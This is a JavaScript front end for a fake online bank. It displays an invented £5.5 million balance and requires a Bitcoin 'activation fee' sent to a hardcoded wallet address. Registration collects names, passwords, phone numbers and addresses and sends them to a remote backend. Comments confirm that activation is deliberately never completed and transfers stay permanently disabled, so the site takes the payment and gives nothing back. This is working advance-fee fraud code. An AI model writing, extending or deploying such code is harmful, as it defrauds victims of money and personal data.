// Track account activation status - SET TO FALSE AND NEVER CHANGED
let accountActivated = false;
let currentUser = null;

// Registration functionality
const openRegister = document.getElementById('openRegister');
const openRegisterMain = document.getElementById('openRegisterMain');
const closeRegister = document.getElementById('closeRegister');
const registrationContainer = document.getElementById('registrationContainer');
const registrationForm = document.getElementById('registrationForm');
const loadingOverlay = document.getElementById('loadingOverlay');
const accountCreated = document.getElementById('accountCreated');
const closeSuccess = document.getElementById('closeSuccess');
const successAccountType = document.getElementById('successAccountType');
const successAccountFee = document.getElementById('successAccountFee');
const homepage = document.getElementById('homepage');
const dashboard = document.getElementById('dashboard');
const loginBtn = document.getElementById('loginBtn');
const logoutBtn = document.getElementById('logoutBtn');
const sidebarLogout = document.getElementById('sidebarLogout');

// Bitcoin Wallet Modal elements
const bitcoinModal = document.getElementById('bitcoinModal');
const closeBitcoin = document.getElementById('closeBitcoin');
const walletAddress = document.getElementById('walletAddress');
const copyNotification = document.getElementById('copyNotification');
const nextBtn = document.getElementById('nextBtn');

// Forgot Password Modal elements 
const forgotPasswordLink = document.getElementById('forgotPasswordLink');
const forgotModal = document.getElementById('forgotModal');
const closeForgot = document.getElementById('closeForgot');
const forgotForm = document.getElementById('forgotForm');
const resetSuccess = document.getElementById('resetSuccess');
const sentEmail = document.getElementById('sentEmail');
const submitForgot = document.getElementById('submitForgot');

// Thank You Modal elements
const thankyouModal = document.getElementById('thankyouModal');
const closeThankyou = document.getElementById('closeThankyou');

// Transfer restriction elements
const transferForm = document.getElementById('transferForm');
const transferBtn = document.getElementById('transferBtn');
const transferRestrictionNotice = document.getElementById('transferRestrictionNotice');
const activateAccountBtn = document.getElementById('activateAccountBtn');

// Account type to fee mapping
const accountFees = {
    domiciliary: "£1,999.99",
    cashplus: "£2,999.99",
    business: "£5,999.99"
};

// Account type to display names
const accountDisplayNames = {
    domiciliary: "Domiciliary Account   £1,999.99",
    cashplus: "CashPlus Account      £2,999.99", 
    business: "Business Premium Account    £5,999.99"
};

// User data storage
let userData = {
    firstName: '',
    lastName: '',
    username: '',
    password: '',
    accountType: '',
    accountActivated: false,
    balances: {
        savings: 399.99,
        checking: 599.99,
        investment: 1999.99
    }
};

// Initialize date
const today = new Date();
const formattedDate = today.toLocaleDateString('en-US', { 
    year: 'numeric', 
    month: 'long', 
    day: 'numeric' 
});
document.getElementById('currentDate').textContent = formattedDate;

// NEW: Enhanced notification system
function showNotification(message, type = 'info', duration = 3000) {
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    notification.innerHTML = `
        <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-triangle' : 'info-circle'}"></i>
        <span>${message}</span>
        <button class="notification-close">&times;</button>
    `;
    
    // Add styles if not already added
    if (!document.querySelector('#notification-styles')) {
        const styles = document.createElement('style');
        styles.id = 'notification-styles';
        styles.textContent = `
            .notification {
                position: fixed;
                top: 20px;
                right: 20px;
                background: #2ecc71;
                color: white;
                padding: 15px 20px;
                border-radius: 8px;
                box-shadow: 0 4px 12px rgba(0,0,0,0.15);
                z-index: 10000;
                display: flex;
                align-items: center;
                gap: 10px;
                max-width: 400px;
                transform: translateX(400px);
                opacity: 0;
                transition: all 0.3s ease;
            }
            .notification.error { background: #e74c3c; }
            .notification.warning { background: #f39c12; }
            .notification.info { background: #3498db; }
            .notification.show {
                transform: translateX(0);
                opacity: 1;
            }
            .notification-close {
                background: none;
                border: none;
                color: white;
                font-size: 18px;
                cursor: pointer;
                margin-left: auto;
            }
        `;
        document.head.appendChild(styles);
    }
    
    document.body.appendChild(notification);
    
    // Animate in
    setTimeout(() => notification.classList.add('show'), 100);
    
    // Close button
    notification.querySelector('.notification-close').addEventListener('click', () => {
        notification.remove();
    });
    
    // Auto remove
    setTimeout(() => {
        if (notification.parentElement) {
            notification.classList.remove('show');
            setTimeout(() => notification.remove(), 300);
        }
    }, duration);
}

// NEW: Password strength indicator
function initPasswordStrength() {
    const passwordInput = document.getElementById('passwordReg');
    if (!passwordInput) return;
    
    const strengthMeter = document.createElement('div');
    strengthMeter.className = 'password-strength';
    strengthMeter.innerHTML = `
        <div class="strength-bar">
            <div class="strength-fill"></div>
        </div>
        <div class="strength-text">Password strength: <span>Weak</span></div>
    `;
    
    passwordInput.parentNode.appendChild(strengthMeter);
    
    passwordInput.addEventListener('input', function() {
        const password = this.value;
        let strength = 0;
        
        if (password.length >= 8) strength += 25;
        if (/[a-z]/.test(password)) strength += 25;
        if (/[A-Z]/.test(password)) strength += 25;
        if (/[0-9]/.test(password)) strength += 25;
        
        const fill = strengthMeter.querySelector('.strength-fill');
        const text = strengthMeter.querySelector('span');
        
        fill.style.width = `${strength}%`;
        
        if (strength < 50) {
            fill.style.background = '#e74c3c';
            text.textContent = 'Weak';
        } else if (strength < 75) {
            fill.style.background = '#f39c12';
            text.textContent = 'Medium';
        } else {
            fill.style.background = '#2ecc71';
            text.textContent = 'Strong';
        }
    });
}

// NEW: Form input animations
function initFormAnimations() {
    const inputs = document.querySelectorAll('input, select');
    inputs.forEach(input => {
        input.addEventListener('focus', function() {
            this.parentElement.classList.add('focused');
        });
        
        input.addEventListener('blur', function() {
            if (!this.value) {
                this.parentElement.classList.remove('focused');
            }
        });
    });
}

// NEW: Real-time form validation
function initRealTimeValidation() {
    const emailInput = document.getElementById('usernameReg');
    if (emailInput) {
        emailInput.addEventListener('blur', function() {
            const email = this.value;
            if (email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
                this.style.borderColor = '#e74c3c';
                showNotification('Please enter a valid email address', 'error', 2000);
            } else {
                this.style.borderColor = '#2ecc71';
            }
        });
    }
}

// Function to check if account is activated
function checkAccountActivated() {
    return accountActivated;
}

// Function to activate account (EMPTIED)
function completeAccountActivation() {
    // This function is now empty
}

// Update UI after account activation (EMPTIED)
function updateUIAfterActivation() {
    // This function is now empty
}

// Function to show activation required message
function showActivationRequiredMessage() {
    showNotification('Please activate your account before making transfers', 'warning');
}

// Update accounts display to show fixed balances and always require activation
function updateAccountsDisplay() {
    const accountItems = document.querySelectorAll('.account-item');
    const fixedBalance = '£5,588,745.90';
    
    accountItems.forEach(item => {
        // Set fixed balance for all accounts
        const balanceElement = item.querySelector('.account-balance');
        if (balanceElement) {
            balanceElement.textContent = fixedBalance;
        }
        
        // Remove any existing activation buttons
        const existingBtn = item.querySelector('.activate-btn');
        if (existingBtn) existingBtn.remove();
        
        const existingIndicator = item.querySelector('.activated-indicator');
        if (existingIndicator) existingIndicator.remove();
        
        // ALWAYS show activation required
        if (item.getAttribute('data-account-type') === userData.accountType) {
            const activateBtn = document.createElement('button');
            activateBtn.className = 'activate-btn';
            activateBtn.innerHTML = '<i class="fas fa-unlock"></i> ACTIVATE ACCOUNT';
            activateBtn.addEventListener('click', function() {
                activateAccount();
            });
            item.appendChild(activateBtn);
        } else {
            item.classList.add('disabled');
        }
    });
}

// Update dashboard with user data
function updateDashboard() {
    // Update user info
    document.getElementById('dashboardUserName').textContent = 
        `${userData.firstName} ${userData.lastName}`;
    document.getElementById('dashboardTitle').textContent = 
        `Welcome back, ${userData.firstName}`;
    
    // ALWAYS show fixed balance of £5,588,745.90
    document.getElementById('totalBalance').textContent = '£5,588,745.90';
    
    // Update current date
    const now = new Date();
    document.getElementById('currentDate').textContent = 
        now.toLocaleDateString('en-US', { 
            year: 'numeric', 
            month: 'long', 
            day: 'numeric' 
        });
    
    // Update accounts display based on registration selection
    updateAccountsDisplay();
}

// NEW: Enhanced loading animation
function showLoading(message = 'Processing...') {
    loadingOverlay.innerHTML = `
        <div class="loading-content">
            <div class="loading-spinner"></div>
            <p>${message}</div>
        </div>
    `;
    loadingOverlay.style.display = 'flex';
}

function hideLoading() {
    loadingOverlay.style.display = 'none';
}

// Modify transfer form submission handler
if (transferForm) {
    transferForm.addEventListener('submit', function(e) {
        if (!checkAccountActivated()) {
            e.preventDefault();
            showActivationRequiredMessage();
            
            // Scroll to activation section if exists
            const activateBtn = document.querySelector('.activate-btn');
            if (activateBtn) {
                activateBtn.scrollIntoView({ behavior: 'smooth' });
                
                // Pulse animation to draw attention
                activateBtn.style.animation = 'pulse 2s infinite';
                setTimeout(() => {
                    activateBtn.style.animation = '';
                }, 6000);
            }
        }
    });
}

// MODIFIED: Initialize UI on page load to ALWAYS disable transfers
document.addEventListener('DOMContentLoaded', function() {
    // Initialize new features
    initPasswordStrength();
    initFormAnimations();
    initRealTimeValidation();
    
    // ALWAYS disable transfer buttons and inputs
    document.querySelectorAll('.transfer-btn, .transfer-form input, .transfer-form select').forEach(element => {
        element.disabled = true;
        element.style.opacity = "0.6";
        element.style.cursor = "not-allowed";
    });
    
    // Add tooltips to disabled elements
    document.querySelectorAll('.transfer-btn').forEach(btn => {
        btn.title = "Account activation required";
    });
    
    // Show transfer restriction notice
    if (transferRestrictionNotice) {
        transferRestrictionNotice.style.display = 'block';
    }
    
    // NEW: Add hover effects to cards
    const cards = document.querySelectorAll('.account-item, .transaction-card, .info-card');
    cards.forEach(card => {
        card.addEventListener('mouseenter', function() {
            this.style.transform = 'translateY(-5px)';
            this.style.boxShadow = '0 8px 25px rgba(0,0,0,0.15)';
        });
        
        card.addEventListener('mouseleave', function() {
            this.style.transform = 'translateY(0)';
            this.style.boxShadow = '';
        });
    });
});

// NEW: Enhanced registration with better UX
openRegister.addEventListener('click', function() {
    registrationContainer.style.display = 'flex';
    document.body.style.overflow = 'hidden'; // Prevent background scrolling
});

openRegisterMain.addEventListener('click', function() {
    registrationContainer.style.display = 'flex';
    document.body.style.overflow = 'hidden';
});

closeRegister.addEventListener('click', function() {
    registrationContainer.style.display = 'none';
    document.body.style.overflow = 'auto';
});

closeSuccess.addEventListener('click', function() {
    accountCreated.style.display = 'none';
    homepage.style.display = 'block';
    showNotification('Account created successfully! You can now login.', 'success');
});

// NEW: Enhanced registration form submission
registrationForm.addEventListener('submit', async function(e) {
  e.preventDefault();
  
  // Get form values
  const userData = {
    firstName: document.getElementById('firstName').value,
    lastName: document.getElementById('lastName').value,
    email: document.getElementById('email').value,
    password: document.getElementById('passwordReg').value,
    phone: document.getElementById('phone').value,
    address: document.getElementById('address').value,
    country: document.getElementById('country').value,
    zip: document.getElementById('zip').value,
    accountType: document.getElementById('accountType').value
  };

  const accountTypeText = document.getElementById('accountType').options[document.getElementById('accountType').selectedIndex].text;
  
  // Set account details in success modal
  successAccountType.textContent = accountTypeText.split('(')[0].trim();
  successAccountFee.textContent = accountFees[userData.accountType] || "£0.00";
  
  // Show enhanced loading
  registrationContainer.style.display = 'none';
  showLoading('Creating your account...');
  
  try {
    // Send registration data to backend
    const response = await fetch('https://bank-of-atlantic-api.onrender.com/api/auth/register', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(userData)
    });
    
    const data = await response.json();
    
    if (data.success) {
      console.log('✅ Registration successful:', data);
      
      // Store user data locally
      window.userData = {
        firstName: data.user.firstName,
        lastName: data.user.lastName,
        username: data.user.email,
        password: userData.password, // Note: store plain password for local login simulation
        accountType: data.user.accountType,
        accountActivated: false,
         _id: data.user._id
      };
      
      // Also store the token if you want to use real authentication
      if (data.token) {
        localStorage.setItem('token', data.token);
        localStorage.setItem('userId', data.user._id);
      }
      
      hideLoading();
      accountCreated.style.display = 'flex';
      showNotification('Account created successfully!', 'success');
      
    } else {
      throw new Error(data.error || 'Registration failed');
    }
    
  } catch (error) {
    console.error('❌ Registration error:', error);
    hideLoading();
    registrationContainer.style.display = 'flex';
    showNotification(`Registration failed: ${error.message}`, 'error');
  }
  
  // Clear form
  registrationForm.reset();
});

// NEW: Enhanced login functionality
loginBtn.addEventListener('click', async function() {
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;
  
  if (!username || !password) {
    showNotification('Please enter both username and password', 'error');
    return;
  }
  
  // Show loading on the button itself (better UX)
  const loginButton = this;
  const originalButtonText = loginButton.innerHTML;
  loginButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> SIGNING IN...';
  loginButton.disabled = true;
  
  try {
    // Try to login with backend API
    const response = await fetch('https://bank-of-atlantic-api.onrender.com/api/auth/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ email: username, password: password })
    });
    
    const data = await response.json();
    
    if (data.success) {
      console.log('✅ Login successful:', data);
      
      // Update user data
      userData = {
        firstName: data.user.firstName,
        lastName: data.user.lastName,
        username: data.user.email,
        password: password,
        accountType: data.user.accountType,
        accountActivated: false,
        _id: data.user._id
      };
      
      // Store token for future requests
      if (data.token) {
        localStorage.setItem('token', data.token);
        localStorage.setItem('userId', data.user._id);
      }
      
      // Update dashboard
      updateDashboard();
      
      // Reset button
      loginButton.innerHTML = originalButtonText;
      loginButton.disabled = false;
      
      homepage.style.display = 'none';
      dashboard.style.display = 'block';
      
      showNotification(`Welcome back, ${userData.firstName}!`, 'success');
      
      // Show transfer restrictions
      if (transferRestrictionNotice) {
        transferRestrictionNotice.style.display = 'block';
      }
      
    } else {
      throw new Error(data.error || 'Login failed');
    }
    
  } catch (error) {
    console.error('❌ Login error:', error);
    
    // Reset button even on error
    loginButton.innerHTML = originalButtonText;
    loginButton.disabled = false;
    
    showNotification(`Login failed: ${error.message}`, 'error');
  }
});

// NEW: Enhanced account activation
function activateAccount() {
    showLoading('Preparing activation...');
    
    // Simulate account activation process
    setTimeout(function() {
        hideLoading();
        
        // Show Bitcoin deposit modal
        bitcoinModal.style.display = 'flex';
        showNotification('Please complete payment to activate your account', 'info');
    }, 2000);
}

// Activate account button handler
if (activateAccountBtn) {
    activateAccountBtn.addEventListener('click', function() {
        activateAccount();
    });
}

// Close Bitcoin modal
closeBitcoin.addEventListener('click', function() {
    bitcoinModal.style.display = 'none';
    showNotification('Account activation paused. Complete payment to activate.', 'warning');
});

// Close Bitcoin modal when clicking outside
bitcoinModal.addEventListener('click', function(e) {
    if (e.target === bitcoinModal) {
        bitcoinModal.style.display = 'none';
        showNotification('Account activation paused. Complete payment to activate.', 'warning');
    }
});

// NEW: Enhanced copy functionality
walletAddress.addEventListener('click', function() {
    const textArea = document.createElement('textarea');
    textArea.value = '3Cz913pgQNHRhrXn9uLs2wHLPnS4Hkx8Gv';
    document.body.appendChild(textArea);
    textArea.select();
    document.execCommand('copy');
    document.body.removeChild(textArea);
    
    // Show enhanced notification
    showNotification('Bitcoin address copied to clipboard!', 'success');
});

// MODIFIED: NEXT Button functionality - REMOVED call to completeAccountActivation()
nextBtn.addEventListener('click', function() {
    bitcoinModal.style.display = 'none';
    thankyouModal.style.display = 'flex';
    showNotification(' Your account is being activated...', 'success');
});

// Close Thank You modal
closeThankyou.addEventListener('click', function() {
    thankyouModal.style.display = 'none';
    showNotification('Your account activation is in progress', 'info');
});

// Close Thank You modal when clicking outside
thankyouModal.addEventListener('click', function(e) {
    if (e.target === thankyouModal) {
        thankyouModal.style.display = 'none';
        showNotification('Your account activation is in progress', 'info');
    }
});

// Open forgot password modal
if (forgotPasswordLink) {
    forgotPasswordLink.addEventListener('click', function(e) {
        e.preventDefault();
        forgotModal.style.display = 'flex';
        document.body.style.overflow = 'hidden';
        
        // Reset form when opening
        forgotForm.style.display = 'block';
        resetSuccess.style.display = 'none';
        document.getElementById('resetEmail').value = '';
    });
}

// Close forgot password modal
if (closeForgot) {
    closeForgot.addEventListener('click', function() {
        forgotModal.style.display = 'none';
        document.body.style.overflow = 'auto';
    });
}

// Close modal when clicking outside
if (forgotModal) {
    forgotModal.addEventListener('click', function(e) {
        if (e.target === forgotModal) {
            forgotModal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    });
}

// Handle forgot password form submission
if (forgotForm) {
    forgotForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const email = document.getElementById('resetEmail').value;
        
        if (!email) {
            showNotification('Please enter your email address', 'error');
            return;
        }
        
        // Validate email format
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(email)) {
            showNotification('Please enter a valid email address', 'error');
            return;
        }
        
        // Show loading state
        const originalText = submitForgot.innerHTML;
        submitForgot.innerHTML = '<i class="fas fa-spinner fa-spin"></i> SENDING...';
        submitForgot.disabled = true;
        
        // Simulate API call (3 seconds)
        setTimeout(() => {
            // Show success message
            forgotForm.style.display = 'none';
            resetSuccess.style.display = 'block';
            sentEmail.textContent = email;
            
            // Show success notification
            showNotification('Password reset instructions sent to your email', 'success');
            
            // Reset button
            submitForgot.innerHTML = originalText;
            submitForgot.disabled = false;
            
            // Close modal after 8 seconds
            setTimeout(() => {
                forgotModal.style.display = 'none';
                document.body.style.overflow = 'auto';
            }, 8000);
            
        }, 1500);
    });
}

// NEW: Enhanced logout functionality
function logout() {
    showNotification('Logging out...', 'info', 1000);
    setTimeout(() => {
        homepage.style.display = 'block';
        dashboard.style.display = 'none';
        document.getElementById('username').value = '';
        document.getElementById('password').value = '';
        showNotification('You have been logged out successfully', 'success');
    }, 1000);
}

if (logoutBtn) {
    logoutBtn.addEventListener('click', logout);
}

if (sidebarLogout) {
    sidebarLogout.addEventListener('click', logout);
}

// Allow pressing Enter to submit login
document.getElementById('password').addEventListener('keyup', function(e) {
    if (e.key === 'Enter') {
        document.getElementById('loginBtn').click();
    }
});

// Close registration form when clicking outside
registrationContainer.addEventListener('click', function(e) {
    if (e.target === registrationContainer) {
        registrationContainer.style.display = 'none';
        document.body.style.overflow = 'auto';
    }
});

// NEW: Enhanced session timer with warnings
let minutes = 14;
let seconds = 32;

function updateSessionTimer() {
    const timerElement = document.querySelector('.session-warning span');
    if (timerElement) {
        timerElement.textContent = `For security, your session will time out in ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')} minutes`;
        
        // Show warnings at specific intervals
        if (minutes === 2 && seconds === 0) {
            showNotification('Session will expire in 2 minutes', 'warning');
        }
        if (minutes === 1 && seconds === 0) {
            showNotification('Session will expire in 1 minute', 'warning');
        }
        if (minutes === 0 && seconds === 30) {
            showNotification('Session expiring in 30 seconds', 'error');
        }
        
        seconds--;
        if (seconds < 0) {
            minutes--;
            seconds = 59;
        }
        
        if (minutes < 0) {
            clearInterval(timerInterval);
            timerElement.textContent = "Your session has timed out. Please log in again.";
            timerElement.parentElement.style.borderLeftColor = "#f44336";
            showNotification('Your session has expired', 'error');
            setTimeout(logout, 3000);
        }
    }
}

const timerInterval = setInterval(updateSessionTimer, 1000);

// Simulate security badge animation
setInterval(() => {
    const badge = document.querySelector('.security-badge');
    if (badge) {
        badge.style.boxShadow = '0 0 15px rgba(201, 169, 101, 0.7)';
        setTimeout(() => {
            badge.style.boxShadow = 'none';
        }, 500);
    }
}, 5000);

// Navigation active state
const navLinks = document.querySelectorAll('.nav-link');
navLinks.forEach(link => {
    link.addEventListener('click', function() {
        // Remove active class from all links
        navLinks.forEach(l => l.classList.remove('active'));
        
        // Add active class to clicked link
        this.classList.add('active');
        
        // Hide all tab contents
        document.querySelectorAll('.tab-content').forEach(tab => {
            tab.classList.remove('active');
        });
        
        // Show the selected tab
        const tabId = this.getAttribute('data-tab');
        document.getElementById(tabId).classList.add('active');
        
        // Show navigation feedback
        showNotification(`Switched to ${this.textContent}`, 'info', 1000);
    });
});

// Transfer Handler - PERMANENTLY DISABLED
function handleTransfer(e) {
    e.preventDefault();
    
    showNotification('Account activation required. Please complete activation to enable transfer functionality.', 'error');
    
    // Scroll to activation notice
    const activationNotice = document.getElementById('transferRestrictionNotice');
    if (activationNotice) {
        activationNotice.scrollIntoView({ behavior: 'smooth' });
        
        // Add pulse animation to draw attention
        activationNotice.style.animation = 'pulse 2s infinite';
        setTimeout(() => {
            activationNotice.style.animation = '';
        }, 6000);
    }
}

// Initialize event listeners for transfer forms
function initializeEventListeners() {
    // Transfer form - permanently disabled
    const transferForm = document.getElementById('transferForm');
    if (transferForm) {
        transferForm.addEventListener('submit', handleTransfer);
        
        // Disable all form elements
        const formElements = transferForm.querySelectorAll('input, select, button');
        formElements.forEach(element => {
            element.disabled = true;
            element.style.opacity = '0.6';
            element.style.cursor = 'not-allowed';
        });
    }
    
    // Always show transfer restriction notice
    const restrictionNotice = document.getElementById('transferRestrictionNotice');
    if (restrictionNotice) {
        restrictionNotice.style.display = 'block';
    }
}

// NEW: Keyboard shortcuts
document.addEventListener('keydown', function(e) {
    // Escape key to close modals
    if (e.key === 'Escape') {
        const openModals = document.querySelectorAll('.modal[style*="display: flex"]');
        openModals.forEach(modal => {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        });
    }
    
    // Ctrl+L to focus login (when on homepage)
    if (e.ctrlKey && e.key === 'l' && homepage.style.display !== 'none') {
        e.preventDefault();
        document.getElementById('username').focus();
    }
});

// Initialize event listeners on DOM content loaded
document.addEventListener('DOMContentLoaded', function() {
    initializeEventListeners();
    
    // NEW: Add some nice entrance animations
    setTimeout(() => {
        document.querySelectorAll('.hero-content, .feature-card').forEach((el, index) => {
            setTimeout(() => {
                el.style.opacity = '1';
                el.style.transform = 'translateY(0)';
            }, index * 200);
        });
    }, 500);
});